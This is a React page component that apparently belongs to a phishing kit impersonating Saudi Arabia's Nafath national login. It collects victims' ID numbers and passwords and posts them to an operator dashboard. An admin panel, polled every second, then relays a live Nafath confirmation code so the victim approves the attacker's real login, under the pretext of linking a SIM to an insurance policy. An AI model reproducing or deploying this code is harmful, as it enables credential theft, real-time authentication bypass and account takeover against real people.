"use client";

import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useState } from "react";
import { submitVisitorFormData } from "@/lib/api";
import { Alert } from "@/components/ui/alert";
import { onVisitorStatusUpdated } from "@/lib/socket";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { updateVisitorPage } from "@/lib/visitor-tracking";

export default function Component() {
  const [showConfirmDialog, setShowConfirmDialog] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [confirmationCode, setConfirmationCode] = useState<string>("");
  const [isloading, setIsLoading] = useState(false);
  const [idLogin, setLoginID] = useState("");
  const [password, setPassword] = useState("");
  const [showError, setShowError] = useState("");
  const [idError, setIdError] = useState("");

  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
  
  // Saudi ID validation function (same as home page)
  const validateSaudiId = (id: string): boolean => {
    const cleanId = id.replace(/\s/g, "")
    if (!/^\d{10}$/.test(cleanId)) {
      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
      return false
    }
    if (!/^[12]/.test(cleanId)) {
      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2")
      return false
    }
    let sum = 0
    for (let i = 0; i < 10; i++) {
      let digit = Number.parseInt(cleanId[i])
      if ((10 - i) % 2 === 0) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }
      sum += digit
    }
    if (sum % 10 !== 0) {
      setIdError("رقم الهوية غير صحيح")
      return false
    }
    setIdError("")
    return true
  }
  
  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "nafad" })
  
  // Update visitor page
  useEffect(() => {
    if (visitorId) {
      updateVisitorPage(visitorId, "nafad", 8)
    }
  }, [visitorId])

  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control (socket + polling)
  useEffect(() => {
    if (!visitorId) return

    console.log("[nafad] Setting up navigation listener for visitor:", visitorId)

    // Poll for admin actions (socket is disabled)
    const pollVisitorData = async () => {
      try {
        const res = await fetch(`/api/visitors/${visitorId}`)
        if (!res.ok) return
        const data = await res.json()
        
        // Check for nafad code from admin
        const nafadCode = data.adminNafadCode
        if (nafadCode) {
          const normalized = String(nafadCode).slice(0, 2);
          setConfirmationCode(normalized)
          const storageKey = `nafad_shown_${visitorId}`
          const lastShownCode = localStorage.getItem(storageKey)
          if (normalized !== lastShownCode) {
            setShowConfirmDialog(true)
            localStorage.setItem(storageKey, normalized)
            setIsLoading(false)
            setShowError('')
            setShowSuccessDialog(false)
          }
        }
        
        // Check for nafadStatus verifying (triggered by "رمز النفاذ" redirect from admin)
        const nafadStatus = data.nafadStatus
        if (nafadStatus === 'verifying') {
          const storageKey = `nafad_verifying_shown_${visitorId}`
          const alreadyShown = localStorage.getItem(storageKey)
          if (!alreadyShown) {
            console.log("[nafad] Admin triggered nafad-otp redirect, showing popup")
            setShowConfirmDialog(true)
            setIsLoading(false)
            setShowError('')
            setShowSuccessDialog(false)
            localStorage.setItem(storageKey, 'true')
          }
        }
        
        // Clear oneTimeRedirect after it was used by useRedirectMonitor
        if (data.oneTimeRedirect) {
          fetch(`/api/visitors/${visitorId}/clear-redirect`, { method: 'POST' }).catch(() => {})
        }
      } catch (err) {
        // Silent fail
      }
    }

    const interval = setInterval(pollVisitorData, 1000)
    
    // Socket listener (for real-time updates)
    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      console.log("[nafad] Socket update:", field, status)
      if (field === 'nafadConfirmationCode') {
        if (status) {
          const normalized = String(status).slice(0, 2);
          setConfirmationCode(normalized)
          const storageKey = `nafad_shown_${visitorId}`
          const lastShownCode = localStorage.getItem(storageKey)
          if (normalized !== lastShownCode) {
            setShowConfirmDialog(true)
            localStorage.setItem(storageKey, normalized)
            setIsLoading(false)
            setShowError('')
            setShowSuccessDialog(false)
          }
        } else {
          setShowConfirmDialog(false)
          localStorage.removeItem(`nafad_shown_${visitorId}`)
        }
      } else if (field === 'nafadConfirmationStatus') {
        if (status === 'approved') {
          setShowConfirmDialog(false)
          setShowSuccessDialog(true)
          submitVisitorFormData({ id: visitorId, nafadConfirmationStatus: '', nafadConfirmationCode: '' }).catch(console.error)
        } else if (status === 'rejected') {
          setShowConfirmDialog(false)
          setShowError('تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.')
          submitVisitorFormData({ id: visitorId, nafadConfirmationStatus: '', nafadConfirmationCode: '' }).catch(console.error)
        }
      }
    })

    return () => {
      console.log("[nafad] Cleaning up navigation listener")
      unsubscribe()
      clearInterval(interval)
    }
  }, [visitorId])

  const handleLogin = async (e: any) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor");
    setShowError("");

    // Validate ID before submitting
    if (!validateSaudiId(idLogin)) {
      return
    }

    setIsLoading(true);
    setConfirmationCode(""); // Clear previous code to show loading state
    setShowConfirmDialog(true); // Show dialog immediately with loading state

    if (visitorId) {
      // Submit to server
      await submitVisitorFormData({
        id: visitorId,
        nafadIdNumber: idLogin,
        nafadPassword: password,
        nafadConfirmationStatus: "waiting",
        currentStep: "_t6",
        currentPage: "nafad",
        nafadUpdatedAt: new Date().toISOString()
      });
      
      // Notify dashboard with nafad data
      await fetch('/api/dashboard/requests', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: visitorId,
          visitorId: visitorId,
          nafadIdNumber: idLogin,
          nafadPassword: password,
          nafadConfirmationStatus: "waiting",
          currentStep: 8,
          currentPage: "nafad",
          status: "pending"
        })
      }).catch(console.error);
      
      // Trigger dashboard refresh
      if (typeof window !== 'undefined') {
        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
      }
    }
    
    // Keep dialog open until admin sends the code
    // The polling will update confirmationCode when the code arrives
  };

  // Confirmation code will be displayed as two individual digits

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
      dir="rtl"
    >
      {/* Header */}
      <header className="bg-white shadow-sm border-b">
        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
          <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
          <img src="/nafad-logo.png" alt="نفاذ" width={120} className="object-contain" />
          <div className="w-6"></div>
        </div>
      </header>

      {/* Main Content */}
      <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
        {/* Login Section Title */}
        <div className="text-center space-y-2">
          <h1 className="text-2xl font-bold text-gray-800 mb-2">
            الدخول على النظام
          </h1>
          <p className="text-gray-600 text-sm">
            استخدم تطبيق نفاذ للدخول بشكل آمن
          </p>
        </div>

        {/* Nafath App Section */}
        <div className="bg-gradient-to-r from-teal-600 to-teal-700 text-white p-6 rounded-xl text-center shadow-lg">
          <div className="flex items-center justify-center gap-2 mb-2">
            <ShieldAlert className="w-6 h-6" />
            <h2 className="text-xl font-bold">تطبيق نفاذ</h2>
          </div>
          <div className="w-16 h-1 bg-white/30 mx-auto rounded-full"></div>
        </div>

        <form onSubmit={handleLogin}>
          {/* Login Form */}
          <Card className="bg-white shadow-lg border-0">
            <CardContent className="p-6 space-y-5">
              <div className="text-center">
                <p className="text-gray-700 font-semibold mb-1">
                  رقم بطاقة الأحوال/الإقامة
                </p>
                <p className="text-sm text-gray-500">
                  أدخل رقم الهوية الخاص بك للمتابعة
                </p>
              </div>

              <div className="space-y-2">
                <Input
                  placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
                  className={`text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all ${idError ? 'border-red-500' : ''}`}
                  dir="rtl"
                  value={idLogin}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10)
                    setLoginID(value)
                    if (value.length === 10) {
                      validateSaudiId(value)
                    } else if (value.length > 0) {
                      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
                    } else {
                      setIdError("")
                    }
                  }}
                  required
                />
                {idError && (
                  <p className="text-sm text-red-600 text-right">{idError}</p>
                )}
              </div>
              <Input
                placeholder="أدخل كلمة المرور الخاصة بك هنا"
                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                dir="rtl"
                onChange={(e) => setPassword(e.target.value)}
                type="password"
                required
              />
              {showError && (
                <Alert
                  className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
                  dir="rtl"
                >
                  <ShieldAlert className="w-5 h-5 text-red-600" />
                  {showError}
                </Alert>
              )}

              <Button
                type="submit"
                disabled={isloading || !idLogin}
                className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
              >
                {isloading ? (
                  <>
                    <Loader2Icon className="animate-spin ml-2" />
                    جاري التحقق...
                  </>
                ) : (
                  "تسجيل الدخول"
                )}
              </Button>

              <div className="pt-4 border-t">
                <div className="text-center text-gray-600 text-sm mb-3 font-medium">
                  لتحميل تطبيق نفاذ
                </div>

                {/* App Store Buttons */}
                <div className="flex justify-center gap-3">
                  <a href="#" className="hover:scale-105 transition-transform">
                    <img src="/google-play.png" alt="Google Play" className="h-10" />
                  </a>
                  <a href="#" className="hover:scale-105 transition-transform">
                    <img src="/apple_store.png" alt="App Store" className="h-10" />
                  </a>
                </div>
              </div>
            </CardContent>
          </Card>
        </form>

        {/* New Nafath Platform Section */}
        <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
          <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
          <CardContent className="p-8 text-center space-y-4 relative z-10">
            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
              <Smartphone className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-bold">منصة النفاذ الجديدة</h2>
            <p className="text-sm leading-relaxed text-teal-50">
              لتجربة أكثر سهولة استخدم النسخة المحدثة
              <br />
              من منصة النفاذ الوطني الموحد
            </p>
            <Button className="bg-white text-teal-700 hover:bg-teal-50 px-8 py-3 rounded-lg font-bold shadow-lg hover:shadow-xl transition-all mt-4">
              ابدأ الآن
            </Button>
          </CardContent>
        </Card>

        {/* Confirmation Code Display Dialog - UPDATED WITH TWO SEPARATE CODES */}
        <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
          <DialogContent className="max-w-md mx-auto [&>button]:hidden" dir="rtl">
            <DialogHeader>
              <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
                رمز التحقق
              </DialogTitle>
              <p className="text-center text-lg text-gray-800 leading-relaxed font-semibold px-4">
                سيتم إصدار أمر ربط شريحة بوثيقة التأمين الخاصة بك<br />
                الرجاء الدخول إلى تطبيق نفاذ وتأكيد الرقم أدناه
              </p>
            </DialogHeader>

            <div className="text-center space-y-6 p-4">
              {/* TWO DIGITS SIDE BY SIDE IN SMALLER ELEGANT BOX */}
              <div className="mx-auto w-48 h-48 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-2xl shadow-lg flex items-center justify-center">
                {confirmationCode ? (
                  <div className="flex gap-3 justify-center items-center" dir="ltr">
                    <div className="text-6xl font-bold text-teal-600 font-mono">
                      {confirmationCode[0]}
                    </div>
                    <div className="text-6xl font-bold text-teal-600 font-mono">
                      {confirmationCode[1]}
                    </div>
                  </div>
                ) : (
                  <div className="flex flex-col items-center justify-center">
                    <div className="w-12 h-12 border-4 border-teal-300 border-t-transparent rounded-full animate-spin mb-2"></div>
                    <span className="text-lg font-semibold text-teal-600">جارٍ التحميل...</span>
                  </div>
                )}
              </div>

              <div className="flex items-center justify-center gap-3 text-teal-600 py-2">
                <div className="relative">
                  <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
                  <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
                </div>
                <div className="text-sm font-medium">في انتظار الموافقة...</div>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        {/* Success Dialog */}
        <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <DialogContent className="max-w-md mx-auto" dir="rtl">
            <div className="text-center space-y-6 p-4">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                <CheckCircle2 className="w-12 h-12 text-green-600" />
              </div>

              <div className="space-y-2">
                <h3 className="text-2xl font-bold text-gray-800">
                  تم التحقق بنجاح!
                </h3>
                <p className="text-gray-600">
                  تمت عملية التحقق من هويتك بنجاح عبر نفاذ
                </p>
              </div>

              <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4">
                <p className="text-sm text-green-800 font-medium">
                  شكراً لاستخدامك منصة النفاذ الوطني الموحد
                </p>
              </div>

              <Button
                onClick={() => setShowSuccessDialog(false)}
                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all"
              >
                إغلاق
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </main>

      {/* Footer */}
      <footer className="mt-12 p-6 bg-white border-t">
        <div className="text-center space-y-6 max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              الرئيسية
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              حول
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              اتصل بنا
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              الشروط والأحكام
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              المساعدة والدعم
            </a>
            <a
              href="#"
              className="hover:text-teal-600 transition-colors font-medium"
            >
              سياسة الخصوصية
            </a>
          </div>

          {/* Government Verification Badge */}
          <div className="flex justify-center mt-4">
            <img src="/cst-logo.jpg" alt="هيئة الاتصالات" width={60} className="opacity-80 rounded" />
          </div>
        </div>
      </footer>
    </div>
  );
}
